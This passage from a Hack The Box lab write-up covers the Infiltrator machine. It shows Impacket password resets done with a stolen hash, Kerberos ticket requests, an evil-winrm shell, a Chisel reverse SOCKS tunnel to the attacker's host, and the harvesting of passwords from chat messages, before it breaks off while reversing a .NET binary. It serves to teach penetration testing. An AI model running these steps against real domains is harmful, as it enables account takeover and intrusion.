infiltrator.htb\m.harris:0xdf0xdf! KDC_ERR_ETYPE_NOSUPP </span></code></pre></div></div> <p>Trying to get a ticket will fail with the same error:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getTGT.py <span class="s1">'infiltrator.htb/m.harris:0xdf0xdf!'</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type) </span></code></pre></div></div> <p>Any tool that uses Impacket is likely to have this same issue.</p> <p>Using <code class="language-plaintext highlighter-rouge">-p ldap</code> will change the password <em>and</em> the AES key, which avoids these issues:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb <span class="nt">-althash</span> :b02e97f2fdb5c3d36f77375383449e56 <span class="nt">-reset</span> <span class="nt">-dc-ip</span> dc01.infiltrator.htb <span class="nt">-newpass</span> <span class="s1">'0xdf0xdf!'</span> <span class="nt">-altuser</span> e.rodriguez <span class="nt">-p</span> ldap <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Setting the password of infiltrator.htb\m.harris as infiltrator.htb\e.rodriguez [*] Password was changed successfully for CN=M.harris,CN=Users,DC=infiltrator,DC=htb </span></code></pre></div></div> <h3 id="shell">Shell</h3> <p>I’ll need to use Kerberos. I’ll get a TGT:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getTGT.py <span class="s1">'infiltrator.htb/m.harris:0xdf0xdf!'</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in m.harris.ccache </span></code></pre></div></div> <p>I’ll need to update my <code class="language-plaintext highlighter-rouge">/etc/krb5.conf</code>, having <code class="language-plaintext highlighter-rouge">netexec</code> generate one for me with <code class="language-plaintext highlighter-rouge">netexec smb infiltrator.htb --generate-krb5-file infiltrator-krb5.conf</code>:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[libdefaults]</span> <span class="py">dns_lookup_kdc</span> <span class="p">=</span> <span class="s">false</span> <span class="py">dns_lookup_realm</span> <span class="p">=</span> <span class="s">false</span> <span class="py">default_realm</span> <span class="p">=</span> <span class="s">INFILTRATOR.HTB</span> <span class="nn">[realms]</span> <span class="py">INFILTRATOR.HTB</span> <span class="p">=</span> <span class="s">{</span> <span class="py">kdc</span> <span class="p">=</span> <span class="s">dc01.infiltrator.htb</span> <span class="py">admin_server</span> <span class="p">=</span> <span class="s">dc01.infiltrator.htb</span> <span class="py">default_domain</span> <span class="p">=</span> <span class="s">infiltrator.htb</span> <span class="err">}</span> <span class="nn">[domain_realm]</span> <span class="py">.infiltrator.htb</span> <span class="p">=</span> <span class="s">INFILTRATOR.HTB</span> <span class="py">infiltrator.htb</span> <span class="p">=</span> <span class="s">INFILTRATOR.HTB</span> </code></pre></div></div> <p>Now I can <code class="language-plaintext highlighter-rouge">evil-winrm</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>m.harris.ccache evil-winrm <span class="nt">-i</span> dc01.infiltrator.htb <span class="nt">-r</span> infiltrator.htb <span class="go"> Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\M.harris\Documents&gt; </span></code></pre></div></div> <p>And grab the user flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\M.harris\desktop&gt; </span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w"> </span><span class="go">d41d8cd9************************ </span></code></pre></div></div> <h2 id="shell-as-winrm_svc">Shell as winrm_svc</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="users">Users</h4> <p>There’s basically nothing in M.Harris’ home directory. There are a couple other home directories on the box:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/20/2024 3:06 AM Administrator d----- 8/2/2024 4:51 PM M.harris d----- 2/19/2024 5:45 PM O.martinez d-r--- 12/4/2023 9:22 AM Public d----- 2/25/2024 7:25 AM winrm_svc </span></code></pre></div></div> <p>M.harris doesn’t have any interesting permissions:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="go"> PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled </span></code></pre></div></div> <h4 id="programs">Programs</h4> <p>In <code class="language-plaintext highlighter-rouge">C:\Program Files</code> there’s a couple interesting programs:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Program Files&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Program Files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/4/2023 9:22 AM Common Files d----- 8/21/2024 1:50 PM Hyper-V d----- 2/19/2024 3:52 AM internet explorer d----- 2/23/2024 5:06 AM Output Messenger d----- 9/6/2024 12:19 PM Output Messenger Server d----- 12/12/2023 10:04 AM PackageManagement d----- 2/19/2024 4:16 AM Update Services d----- 12/4/2023 9:23 AM VMware d-r--- 11/5/2022 12:03 PM Windows Defender d----- 8/21/2024 1:50 PM Windows Defender Advanced Threat Protection d----- 11/5/2022 12:03 PM Windows Mail d----- 8/21/2024 1:50 PM Windows Media Player d----- 9/15/2018 12:19 AM Windows Multimedia Platform d----- 9/15/2018 12:28 AM windows nt d----- 11/5/2022 12:03 PM Windows Photo Viewer d----- 9/15/2018 12:19 AM Windows Portable Devices d----- 9/15/2018 12:19 AM Windows Security d----- 12/12/2023 10:04 AM WindowsPowerShell </span></code></pre></div></div> <p><a href="https://www.outputmessenger.com/">Output Messenger</a> certainly jumps out as unusual. I can get into the client, but there’s nothing interesting. M.Harris is not able to access the server files.</p> <h4 id="network">Network</h4> <p>Looking at listening ports, there’s a stretch in the 14181-14130 that weren’t found by <code class="language-plaintext highlighter-rouge">nmap</code>:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="go"> Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 896 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 896 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 240 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2640 TCP 0.0.0.0:14118 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14119 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14121 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14122 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14123 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:14125 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:14126 0.0.0.0:0 LISTENING 3376 TCP 0.0.0.0:14127 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14128 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14130 0.0.0.0:0 LISTENING 7240 TCP 0.0.0.0:14406 0.0.0.0:0 LISTENING 3868 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 476 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1224 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1676 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 2184 TCP 0.0.0.0:49690 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49691 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49694 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49707 0.0.0.0:0 LISTENING 616 TCP 0.0.0.0:49721 0.0.0.0:0 LISTENING 2116 TCP 0.0.0.0:49747 0.0.0.0:0 LISTENING 2092 TCP 0.0.0.0:49841 0.0.0.0:0 LISTENING 2772 TCP 10.10.11.31:53 0.0.0.0:0 LISTENING 2116 TCP 10.10.11.31:139 0.0.0.0:0 LISTENING 4 ...[snip]... TCP 10.10.11.31:15220 0.0.0.0:0 LISTENING 7008 TCP 10.10.11.31:15230 0.0.0.0:0 LISTENING 7352 ...[snip]... TCP 127.0.0.1:53 0.0.0.0:0 LISTENING 2116 ...[snip]... TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:88 [::]:0 LISTENING 636 TCP [::]:135 [::]:0 LISTENING 896 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:464 [::]:0 LISTENING 636 TCP [::]:593 [::]:0 LISTENING 896 TCP [::]:3389 [::]:0 LISTENING 240 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:9389 [::]:0 LISTENING 2640 TCP [::]:14118 [::]:0 LISTENING 7240 TCP [::]:14122 [::]:0 LISTENING 7240 TCP [::]:14123 [::]:0 LISTENING 4 TCP [::]:14125 [::]:0 LISTENING 4 TCP [::]:14126 [::]:0 LISTENING 3376 TCP [::]:14127 [::]:0 LISTENING 7240 TCP [::]:14128 [::]:0 LISTENING 7240 TCP [::]:14130 [::]:0 LISTENING 7240 TCP [::]:14406 [::]:0 LISTENING 3868 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49664 [::]:0 LISTENING 476 TCP [::]:49665 [::]:0 LISTENING 1224 TCP [::]:49666 [::]:0 LISTENING 1676 TCP [::]:49667 [::]:0 LISTENING 636 TCP [::]:49669 [::]:0 LISTENING 2184 TCP [::]:49690 [::]:0 LISTENING 636 TCP [::]:49691 [::]:0 LISTENING 636 TCP [::]:49694 [::]:0 LISTENING 636 TCP [::]:49707 [::]:0 LISTENING 616 TCP [::]:49721 [::]:0 LISTENING 2116 TCP [::]:49747 [::]:0 LISTENING 2092 TCP [::]:49841 [::]:0 LISTENING 2772 TCP [::1]:53 [::]:0 LISTENING 2116 ...[snip]... TCP [::1]:51420 [::1]:49667 TIME_WAIT 0 TCP [::1]:51428 [::1]:9389 TIME_WAIT 0 ...[snip]... </span></code></pre></div></div> <p>I’ll use <a href="https://superuser.com/a/1049891">this block</a> to print listening ports with their process name:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="800"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="nv">$nets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select-string</span><span class="w"> </span><span class="nx">LISTENING</span><span class="w"> </span><span class="gp">‍</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$n</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$nets</span><span class="p">){</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="c"># make split easier PLUS make it a string instead of a match object:</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$n</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s1">' +'</span><span class="p">,</span><span class="s1">' '</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="c"># make it an array:</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="nv">$nar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$p</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="c"># pick last item:</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="nv">$pname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-id</span><span class="w"> </span><span class="nv">$nar</span><span class="p">[</span><span class="nt">-1</span><span class="p">])</span><span class="o">.</span><span class="nf">ProcessName</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="nv">$ppath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-id</span><span class="w"> </span><span class="nv">$nar</span><span class="p">[</span><span class="nt">-1</span><span class="p">])</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="c"># print the modified line with processname instead of PID:</span><span class="w"> </span><span class="gp">‍</span><span class="w"> </span><span class="nv">$n</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="nv">$nar</span><span class="p">[</span><span class="nt">-1</span><span class="p">]</span><span class="si">)</span><span class="s2">"</span><span class="p">,</span><span class="s2">"</span><span class="si">$(</span><span class="nv">$ppath</span><span class="si">)</span><span class="s2"> </span><span class="si">$(</span><span class="nv">$pname</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="gp">‍</span><span class="p">}</span><span class="w"> </span><span class="go"> TCP 0.0.0.0:80 0.0.0.0:0 LISTENING System TCP 0.0.0.0:88 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:135 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0:389 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0: System System5 0.0.0.0:0 LISTENING System TCP 0.0.0.0:464 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:593 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0: lsass 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING System TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING Microsoft.ActiveDirectory.WebServices TCP 0.0.0.0:14118 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14119 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14121 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14122 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:1 System123 0.0.0.0:0 LISTENING System TCP 0.0.0.0:1 System125 0.0.0.0:0 LISTENING System TCP 0.0.0.0:14126 0.0.0.0:0 LISTENING outputmessenger_httpd TCP 0.0.0.0:14127 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14128 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14130 0.0.0.0:0 LISTENING OMServerService TCP 0.0.0.0:14406 0.0.0.0:0 LISTENING outputmessenger_mysqld TCP 0.0.0.0:15223 0.0.0.0:0 LISTENING OutputMessenger TCP 0.0.0.0: System7001 0.0.0.0:0 LISTENING System TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING wininit TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING svchost TCP 0.0.0.0:49682 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:49683 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:49686 0.0.0.0:0 LISTENING lsass TCP 0.0.0.0:49701 0.0.0.0:0 LISTENING services TCP 0.0.0.0:49714 0.0.0.0:0 LISTENING dns TCP 0.0.0.0:49739 0.0.0.0:0 LISTENING certsrv TCP 0.0.0.0:49892 0.0.0.0:0 LISTENING dfsrs TCP 10.10.11.31:53 0.0.0.0:0 LISTENING dns TCP 10.10.11.31:139 0.0.0.0:0 LISTENING System TCP 10.10.11.31:15220 0.0.0.0:0 LISTENING OutputMessenger TCP 10.10.11.31:15230 0.0.0.0:0 LISTENING OutputMessenger TCP 127.0.0.1:53 0.0.0.0:0 LISTENING dns TCP [::]:80 [::]:0 LISTENING System TCP [::]:88 [::]:0 LISTENING lsass TCP [::]:135 [::]:0 LISTENING svchost TCP [::]: System System5 [::]:0 LISTENING System TCP [::]:464 [::]:0 LISTENING lsass TCP [::]:593 [::]:0 LISTENING svchost TCP [::]:3389 [::]:0 LISTENING svchost TCP [::]:5985 [::]:0 LISTENING System TCP [::]:9389 [::]:0 LISTENING Microsoft.ActiveDirectory.WebServices TCP [::]:14118 [::]:0 LISTENING OMServerService TCP [::]:14122 [::]:0 LISTENING OMServerService TCP [::]:1 System123 [::]:0 LISTENING System TCP [::]:1 System125 [::]:0 LISTENING System TCP [::]:14126 [::]:0 LISTENING outputmessenger_httpd TCP [::]:14127 [::]:0 LISTENING OMServerService TCP [::]:14128 [::]:0 LISTENING OMServerService TCP [::]:14130 [::]:0 LISTENING OMServerService TCP [::]:14406 [::]:0 LISTENING outputmessenger_mysqld TCP [::]:15223 [::]:0 LISTENING OutputMessenger TCP [::]: System7001 [::]:0 LISTENING System TCP [::]:49664 [::]:0 LISTENING wininit TCP [::]:49665 [::]:0 LISTENING svchost TCP [::]:49666 [::]:0 LISTENING svchost TCP [::]:49667 [::]:0 LISTENING lsass TCP [::]:49669 [::]:0 LISTENING svchost TCP [::]:49682 [::]:0 LISTENING lsass TCP [::]:49683 [::]:0 LISTENING lsass TCP [::]:49686 [::]:0 LISTENING lsass TCP [::]:49701 [::]:0 LISTENING services TCP [::]:49714 [::]:0 LISTENING dns TCP [::]:49739 [::]:0 LISTENING certsrv TCP [::]:49892 [::]:0 LISTENING dfsrs TCP [::1]:53 [::]:0 LISTENING dns </span></code></pre></div></div> <p>There’s a bunch of ports listening from <code class="language-plaintext highlighter-rouge">OMServerService</code>, as well as <code class="language-plaintext highlighter-rouge">outputmessenger_httpd</code>, <code class="language-plaintext highlighter-rouge">outputmessenger_mysqld</code>, and <code class="language-plaintext highlighter-rouge">OutputMessenger</code>. The <a href="https://support.outputmessenger.com/connect-to-server-from-internet/">Output Messenger docs</a> show that the server runs on ports 14121-14124. <a href="https://support.outputmessenger.com/server-install-faq/">This page</a> says:</p> <blockquote> <p>The Ports need to be opened in the Firewall are from 14121 to 14124</p> <p><strong>14121 TCP – Application</strong></p> <p><strong>14122 TCP – File Transfer</strong></p> <p><strong>14123 TCP – Web server for Browser Version</strong></p> <p><strong>14124 TCP &amp; UDP – VoIP for Voice/Video/Desktop Sharing</strong></p> <p>14127 to 14129 ports are used internally. (No need to add in Firewall)</p> </blockquote> <h4 id="tunnel">Tunnel</h4> <p>I’ll upload the latest <a href="https://github.com/jpillora/chisel">Chisel</a> release for Windows and start the server on my side, connecting to it creating a SOCKS proxy:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\c.exe</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.6:8000</span><span class="w"> </span><span class="nx">R:1080:socks</span><span class="w"> </span><span class="go">c.exe : 2024/09/06 13:30:16 client: Connecting to ws://10.10.14.6:8000 2024/09/06 13:30:16 client: Connected (Latency 16.1869ms) </span></code></pre></div></div> <p>Now I can access the various pages through the tunnel with FoxyProxy set up as:</p> <picture> <source type="image/webp" srcset="/img/image-20240906163921244.webp" /> <img loading="lazy" src="/img/image-20240906163921244.png" alt="image-20240906163921244" class="include_image " /> </picture> <p>Scanning through the open ports, 14123, 14125, and 14126 respond to HTTP.</p> <h4 id="output-messenger---tcp-14123">Output Messenger - TCP 14123</h4> <p>Visiting <code class="language-plaintext highlighter-rouge">/</code> redirects to <code class="language-plaintext highlighter-rouge">/ombro/index.html</code>, which is an instance of Output Messenger:</p> <picture> <source type="image/webp" srcset="/img/image-20240906164221860.webp" /> <img loading="lazy" src="/img/image-20240906164221860.png" alt="image-20240906164221860" class="include_image " /> </picture> <p>The logo at the top left matches the pages for the site.</p> <h4 id="api---tcp-14125">API - TCP 14125</h4> <p>There’s some kind of API on 14125:</p> <picture> <source type="image/webp" srcset="/img/image-20240906164333318.webp" /> <img loading="lazy" src="/img/image-20240906164333318.png" alt="image-20240906164333318" class="include_image " /> </picture> <h4 id="unknown-site---tcp-14126">Unknown Site - TCP 14126</h4> <p>This page returns a directory listing:</p> <picture> <source type="image/webp" srcset="/img/image-20240906164614033.webp" /> <img loading="lazy" src="/img/image-20240906164614033.png" alt="image-20240906164614033" class="include_image " /> </picture> <p>The <code class="language-plaintext highlighter-rouge">output</code> directory returns a 404 page:</p> <picture> <source type="image/webp" srcset="/img/image-20240906164635878.webp" /> <img loading="lazy" src="/img/image-20240906164635878.png" alt="image-20240906164635878" class="include_image " /> </picture> <h3 id="get-userexplorerexe">Get UserExplorer.exe</h3> <h4 id="output-messenger-as-kturner">Output Messenger as K.Turner</h4> <p>The user enumeration <a href="/2025/06/14/htb-infiltrator.html#user-enumeration">above</a> showed the password “MessengerApp@Pass!” for K.Turner, which works here to log in:</p> <picture> <source type="image/webp" srcset="/img/image-20240906165159425.webp" /> <img loading="lazy" src="/img/image-20240906165159425.png" alt="image-20240906165159425" class="include_image " /> </picture> <p>The General_Chat room has a single message from the admin:</p> <picture> <source type="image/webp" srcset="/img/image-20240906165852671.webp" /> <img loading="lazy" src="/img/image-20240906165852671.png" alt="image-20240906165852671" class="include_image " /> </picture> <p>The Dev_Chat room has a bunch of chat about LDAP and programming to use it in their app. It does mention “our Output Wall”:</p> <picture> <source type="image/webp" srcset="/img/image-20240906170018586.webp" /> <img loading="lazy" src="/img/image-20240906170018586.png" alt="image-20240906170018586" class="include_image " /> </picture> <p>There’s also a message from admin asking for the final copy of the app:</p> <picture> <source type="image/webp" srcset="/img/image-20240906170444500.webp" /> <img loading="lazy" src="/img/image-20240906170444500.png" alt="image-20240906170444500" class="include_image " /> </picture> <h4 id="output-wall">Output Wall</h4> <p>Researching <a href="https://support.outputmessenger.com/output-wall-integration/">Output Wall</a>, it’s a plugin to the chat application designed for interoffice communication. I’ll download the Output messenger application from <a href="https://www.outputmessenger.com/lan-messenger-downloads/">here</a> and install it on my Linux VM.</p> <p>I’ll start it with <code class="language-plaintext highlighter-rouge">proxychains outputmessenger</code>, and it offers a login screen I’ll enter K.Turner and their creds, with the server as <code class="language-plaintext highlighter-rouge">127.0.0.1</code> (using proxychains to get to Infiltrator):</p> <picture> <source type="image/webp" srcset="/img/image-20240906180627086.webp" /> <img loading="lazy" src="/img/image-20240906180627086.png" alt="image-20240906180627086" class="include_image " /> </picture> <p>On entering K.Turner’s creds, it shows a similar interface with additional options:</p> <picture> <source type="image/webp" srcset="/img/image-20240906173821757.webp" /> <img loading="lazy" src="/img/image-20240906173821757.png" alt="image-20240906173821757" class="include_image " /> </picture> <p>The chat is nicer looking:</p> <picture> <source type="image/webp" srcset="/img/image-20240906173846037.webp" /> <img loading="lazy" src="/img/image-20240906173846037.png" alt="image-20240906173846037" class="include_image " /> </picture> <p><em>Proxychains note:</em> It was very common to have issue running the Linux application over <code class="language-plaintext highlighter-rouge">proxychains</code>. I discovered during solving that <code class="language-plaintext highlighter-rouge">proxychains3</code> worked great, but if I had upgraded to <code class="language-plaintext highlighter-rouge">proxychains4</code>, it would just show a white box. Running <code class="language-plaintext highlighter-rouge">proxychains3 outputmessenger</code> works great for me, even after installing version 4. An alternative is to set up Chisel to forward all the necessary ports (which I think based on my <code class="language-plaintext highlighter-rouge">proxychains</code> output are 14121, 14125, are 14126, but doing 14121-14130 to be safe wouldn’t hurt).</p> <p>The bottom option on the menu bar to the top left is the Wall:</p> <picture> <source type="image/webp" srcset="/img/image-20240906174029857.webp" /> <img loading="lazy" src="/img/image-20240906174029857.png" alt="image-20240906174029857" class="include_image " /> </picture> <p>The wall has messages on it:</p> <picture> <source type="image/webp" srcset="/img/image-20240906174757554.webp" /> <img loading="lazy" src="/img/image-20240906174757554.png" alt="image-20240906174757554" class="include_image " /> </picture> <p>The post from K.Turner has M.Harris’ password on it:</p> <picture> <source type="image/webp" srcset="/img/image-20240906174827981.webp" /> <img loading="lazy" src="/img/image-20240906174827981.png" alt="image-20240906174827981" class="include_image " /> </picture> <p>That password works for M.Harris:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> m.harris <span class="nt">-p</span> <span class="s1">'D3v3l0p3r_Pass@1337!'</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\m.harris:D3v3l0p3r_Pass@1337! </span></code></pre></div></div> <h4 id="output-messenger-as-mharris">Output Messenger as M.Harris</h4> <p>Those creds also work to log into Output Messenger as M.Harris. They have a chat with Admin</p> <picture> <source type="image/webp" srcset="/img/image-20240906180953052.webp" /> <img loading="lazy" src="/img/image-20240906180953052.png" alt="image-20240906180953052" class="include_image " /> </picture> <p>Clicking download, the file shows up on my host as <code class="language-plaintext highlighter-rouge">~/Output\ Messenger/FBBB/Received\ Files/Feb\ 2024/UserExplorer.exe</code>.</p> <h3 id="userexplorerexe">UserExplorer.exe</h3> <h4 id="file-overview">File Overview</h4> <p>The file is a Windows .NET 32-bit executable:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>file UserExplorer.exe <span class="go">UserExplorer.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections </span></code></pre></div></div> <p>On a Windows VM, running it offers a help menu:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS Z:\hackthebox\infiltrator-10.10.11.31 &gt; </span><span class="o">.</span><span class="n">\UserExplorer.exe</span><span class="w"> </span><span class="go">Usage: UserExplorer.exe -u &lt;username&gt; -p &lt;password&gt; -s &lt;searchedUsername&gt; [-default] To use the default credentials: UserExplorer.exe -default -s userToSearch </span></code></pre></div></div> <p>Running it fails to connect to a server (which makes sense as my Windows VM isn’t connected to the HTB VPN at this time):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS Z:\hackthebox\infiltrator-10.10.11.31 &gt; </span><span class="o">.</span><span class="n">\UserExplorer.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">harris</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="go">Attempting Service Connection... Service Connection Successful. Search for test user... An error occurred: The server is not operational. </span><span class="gp">PS Z:\hackthebox\infiltrator-10.10.11.31 &gt; </span><span class="o">.</span><span class="n">\UserExplorer.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="nt">-default</span><span class="w"> </span><span class="go">Attempting Service Connection... Service Connection Successful. Search for test user... </span></code></pre></div></div> <h4 id="reversing-main">Reversing Main</h4> <p>I’ll open the file in DotPeek. It has two classes:</p> <picture> <source type="image/webp" srcset="/img/image-20240906183422295.webp" /> <img loading="lazy" src="/img/image-20240906183422295.png" alt="image-20240906183422295" class="include_image " /> </picture> <p>The <code class="language-plaintext highlighter-rouge">LdapApp.Main</code> function is relatively simple. It starts by defining some variables:</p> <div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">internal</span> <span class="k">class</span> <span class="nc">LdapApp</span> <span class="p">{</span> <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span> <span class="kt">string</span> <span class="n">path</span> <span class="p">=</span> <span 